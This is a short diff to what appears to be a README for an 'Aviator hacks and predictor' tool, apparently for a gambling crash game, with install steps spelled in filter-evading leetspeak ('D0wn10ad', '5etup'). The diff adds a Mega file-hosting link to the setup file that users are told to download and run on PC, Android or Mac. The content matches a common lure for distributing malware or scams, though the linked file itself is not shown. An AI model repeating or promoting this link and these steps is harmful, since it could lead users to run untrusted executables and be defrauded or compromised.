@@ -8,3 +8,4 @@
 2. D0wn10ad the setup for your platform — PC, Android (APK), or Mac.
 3. Run the 5etup file.
 4. Enjoy Av1at0r using hack5, and predictor!
+https://mega.nz/file/f1Zl3A6Q#LAa2gdSKAIG1Kb4F7Ss5Zm8vt_fnFq0SXrhBHwA_Qbc
